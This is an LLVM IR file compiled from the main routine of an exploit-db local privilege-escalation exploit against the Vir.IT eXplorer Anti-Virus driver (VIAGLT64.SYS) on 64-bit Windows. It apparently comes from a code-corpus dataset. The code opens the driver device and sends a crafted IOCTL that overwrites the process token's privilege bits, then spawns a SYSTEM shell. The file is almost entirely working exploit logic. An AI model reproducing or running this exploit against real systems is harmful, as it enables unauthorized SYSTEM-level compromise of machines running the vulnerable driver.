; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43109.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43109.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAX_PATH = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [81 x i8] c"-------------------------------------------------------------------------------\0A\00", align 1
@.str.1 = private unnamed_addr constant [81 x i8] c"       Vir.IT eXplorer Anti-Virus (VIAGLT64.SYS) Arbitrary Write EoP Exploit   \0A\00", align 1
@.str.2 = private unnamed_addr constant [81 x i8] c"                 Tested on 64bit Windows 7 / Windows 10 (1709)                 \0A\00", align 1
@.str.3 = private unnamed_addr constant [43 x i8] c"\0A[i] Address of current process token 0x%p\00", align 1
@.str.4 = private unnamed_addr constant [63 x i8] c"\0A[i] Address of _SEP_TOKEN_PRIVILEGES 0x%p will be overwritten\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"\\\\.\\%s\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"viragtlt\00", align 1
@GENERIC_READ = common dso_local global i32 0, align 4
@GENERIC_WRITE = common dso_local global i32 0, align 4
@FILE_SHARE_READ = common dso_local global i32 0, align 4
@FILE_SHARE_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [29 x i8] c"\0A[-] Open %s device failed\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [31 x i8] c"\0A[+] Open %s device successful\00", align 1
@.str.9 = private unnamed_addr constant [38 x i8] c"\0A[~] Press any key to continue . . .\0A\00", align 1
@.str.10 = private unnamed_addr constant [44 x i8] c"[+] Overwritten _SEP_TOKEN_PRIVILEGES bits\0A\00", align 1
@.str.11 = private unnamed_addr constant [26 x i8] c"[*] Spawning SYSTEM Shell\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i32, align 4
  %13 = alloca [3 x i32], align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 64, i32* %7, align 4
  %15 = load i32, i32* @MAX_PATH, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %10, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %11, align 8
  store i32 0, i32* %12, align 4
  %19 = bitcast [3 x i32]* %13 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %19, i8 0, i64 12, i1 false)
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.1, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.2, i64 0, i64 0))
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %24 = call i32 (...) @GetCurrentProcess()
  %25 = call i32 (...) @GetCurrentProcessId()
  %26 = call i32 @TokenAddressCurrentProcess(i32 %24, i32 %25)
  store i32 %26, i32* %8, align 4
  %27 = load i32, i32* %8, align 4
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.3, i64 0, i64 0), i32 %27)
  %29 = load i32, i32* %8, align 4
  %30 = load i32, i32* %7, align 4
  %31 = add nsw i32 %29, %30
  store i32 %31, i32* %6, align 4
  %32 = load i32, i32* %6, align 4
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.4, i64 0, i64 0), i32 %32)
  %34 = load i32, i32* %6, align 4
  %35 = getelementptr inbounds [3 x i32], [3 x i32]* %13, i64 0, i64 0
  store i32 %34, i32* %35, align 4
  %36 = getelementptr inbounds [3 x i32], [3 x i32]* %13, i64 0, i64 1
  store i32 34668544, i32* %36, align 4
  %37 = getelementptr inbounds [3 x i32], [3 x i32]* %13, i64 0, i64 2
  store i32 1114112, i32* %37, align 4
  %38 = call i32 @sprintf(i8* %18, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %39 = load i32, i32* @GENERIC_READ, align 4
  %40 = load i32, i32* @GENERIC_WRITE, align 4
  %41 = or i32 %39, %40
  %42 = load i32, i32* @FILE_SHARE_READ, align 4
  %43 = load i32, i32* @FILE_SHARE_WRITE, align 4
  %44 = or i32 %42, %43
  %45 = load i32, i32* @OPEN_EXISTING, align 4
  %46 = call i64 @CreateFile(i8* %18, i32 %41, i32 %44, i32* null, i32 %45, i32 0, i32* null)
  store i64 %46, i64* %9, align 8
  %47 = load i64, i64* %9, align 8
  %48 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %49 = icmp eq i64 %47, %48
  br i1 %49, label %50, label %52

50:                                               ; preds = %2
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.7, i64 0, i64 0), i8* %18)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %14, align 4
  br label %65

52:                                               ; preds = %2
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.8, i64 0, i64 0), i8* %18)
  br label %54

54:                                               ; preds = %52
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.9, i64 0, i64 0))
  %56 = call i32 (...) @getch()
  %57 = load i64, i64* %9, align 8
  %58 = getelementptr inbounds [3 x i32], [3 x i32]* %13, i64 0, i64 0
  %59 = call i32 @DeviceIoControl(i64 %57, i32 -2106392452, i32* %58, i32 12, i32* null, i32 0, i32* %12, i32* null)
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.10, i64 0, i64 0))
  %61 = load i64, i64* %9, align 8
  %62 = call i32 @CloseHandle(i64 %61)
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0))
  %64 = call i32 (...) @spawnShell()
  store i32 0, i32* %3, align 4
  store i32 1, i32* %14, align 4
  br label %65

65:                                               ; preds = %54, %50
  %66 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %66)
  %67 = load i32, i32* %3, align 4
  ret i32 %67
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i32 @printf(i8*, ...) #3

declare dso_local i32 @TokenAddressCurrentProcess(i32, i32) #3

declare dso_local i32 @GetCurrentProcess(...) #3

declare dso_local i32 @GetCurrentProcessId(...) #3

declare dso_local i32 @sprintf(i8*, i8*, i8*) #3

declare dso_local i64 @CreateFile(i8*, i32, i32, i32*, i32, i32, i32*) #3

declare dso_local i32 @getch(...) #3

declare dso_local i32 @DeviceIoControl(i64, i32, i32*, i32, i32*, i32, i32*, i32*) #3

declare dso_local i32 @CloseHandle(i64) #3

declare dso_local i32 @spawnShell(...) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
